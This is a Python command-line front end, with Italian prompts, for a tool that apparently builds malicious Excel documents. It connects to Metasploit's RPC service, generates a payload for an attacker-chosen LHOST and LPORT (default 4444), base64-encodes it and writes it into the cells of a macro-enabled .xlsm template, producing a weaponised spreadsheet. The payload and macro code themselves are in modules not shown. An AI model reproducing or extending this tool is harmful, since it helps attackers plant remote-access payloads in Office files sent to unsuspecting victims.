import time
from utils import CustomLogger
from excel_handler import ExcelHandler
from payload_handler import PayloadHandler
from utils import CustomLogger

class Cli:
    def __init__(self, logger: CustomLogger, excel_handler: ExcelHandler, payload_handler: PayloadHandler):
        self.logger = logger
        self.excel_handler = excel_handler
        self.payload_handler = payload_handler

    def start(self):
        self.logger.info('Starting...')
        time.sleep(2)
        self.logger.info("Avvia Msfconsole prima di cominciare e invia il comando 'load msgrpc'")
        time.sleep(2)
        self.logger.info('Salva la password e non chiudere il terminale!')
        time.sleep(2)
        input("Premi invio quando sei pronto!")
        time.sleep(1)
        self.logger.info("Scrivi in qualsiasi momento 'exit' per uscire")
        time.sleep(1)
        self.logger.info('Inserisci i parametri richiesti:')
        time.sleep(1)
        # Richiede il percorso del file Excel sorgente fino a che non è valido
        while True:
            excel = input("Percorso del file Excel sorgente (.xlsx): ").strip()
            time.sleep(1)
            if excel.lower() == "exit":
                self.logger.info("Uscita dall'applicazione.")
                exit(0)
            self.excel_handler.filename = excel
            self.logger.info("Concedi i permessi ad Excel quando richiesti")
            input("Premi un tasto quando fatto!")
            time.sleep(1)
            try:
                self.excel_handler.load_source()
                break  # Esce dal loop se il caricamento va a buon fine
            except Exception as ex:
                self.logger.error(str(ex))
                self.logger.info("Il file Excel sorgente non è valido. Riprova.")

        # Richiede il percorso del file template fino a che non è valido
        while True:
            tpl = input("Percorso del file template (.xlsm) contenente macro: ").strip()
            time.sleep(1)
            if tpl.lower() == "exit":
                self.logger.info("Uscita dall'applicazione.")
                exit(0)
            self.excel_handler.template = tpl
            self.logger.info("Concedi i permessi ad Excel quando richiesti")
            input("Premi un tasto quando fatto!")
            try:
                self.excel_handler.load_template()
                break
            except Exception as ex:
                self.logger.error(str(ex))
                self.logger.info("Il file template non è valido. Riprova.")

        # Parametri per Metasploit
        msf_password_input = input("Password per Metasploit: ").strip()
        if msf_password_input.lower() == "exit":
            self.logger.info("Uscita dall'applicazione.")
            exit(0)
        msf_host_input = input("Indirizzo host di Metasploit (default 127.0.0.1): ").strip() or "127.0.0.1"
        if msf_host_input.lower() == "exit":
            self.logger.info("Uscita dall'applicazione.")
            exit(0)
        msf_port_input = input("Porta di Metasploit (default 55552): ").strip() or "55552"
        if msf_port_input.lower() == "exit":
            self.logger.info("Uscita dall'applicazione.")
            exit(0)
        try:
            msf_port = int(msf_port_input)
        except ValueError:
            self.logger.error("Porta Metasploit non valida, utilizzo il valore di default 55552.")
            msf_port = 55552

        # Gestione del payload
        while True:
            payload_flag = input("Generare payload e inserirlo nel template? (s/n/e): ").strip().lower()
            if payload_flag == "exit" or payload_flag.startswith('e'):
                self.logger.info("Uscita dall'applicazione.")
                exit(0)
            elif payload_flag.startswith('s'):
                generate_payload = True
                lhost = input("Indirizzo LHOST per il payload (default 127.0.0.1): ").strip() or "127.0.0.1"
                lport_input = input("Porta LPORT per il payload (default 4444): ").strip() or "4444"
                try:
                    lport = int(lport_input)
                except ValueError:
                    self.logger.error("Porta LPORT non valida, utilizzo il valore di default 4444.")
                    lport = 4444
                break
            elif payload_flag.startswith('n'):
                generate_payload = False
                lhost = None
                lport = None
                break
            else:
                self.logger.info("Input non valido. Inserisci 's' per sì, 'n' per no o 'e' per uscire.")

        # Imposta i parametri di connessione in PayloadHandler
        self.payload_handler.password = msf_password_input
        self.payload_handler.host = msf_host_input
        self.payload_handler.port = msf_port

        # Gestione della connessione a Metasploit
        while True:
            try:
                client = self.payload_handler.connect()
                break
            except Exception as e:
                error_msg = f"Errore durante la connessione a Metasploit: {e}"
                self.logger.error(error_msg)
                retry = input("Ritentare la connessione? (s/n): ").strip().lower()
                if not retry.startswith('s'):
                    self.logger.info("Uscita dal programma.")
                    exit(1)
                else:
                    self.logger.info("Ritento la connessione...")

        # Esegue le altre operazioni (copia contenuto, generazione payload, salvataggio, ecc.)
        self.excel_handler.copy_content()
        if generate_payload:
            payload_b64 = self.payload_handler.generate_payload(lhost, lport)
            if payload_b64:
                self.excel_handler.write_payload_to_cells(payload_b64)
            else:
                self.logger.error("Generazione del payload fallita.")
        self.excel_handler.save_workbook(save_as_new=False)
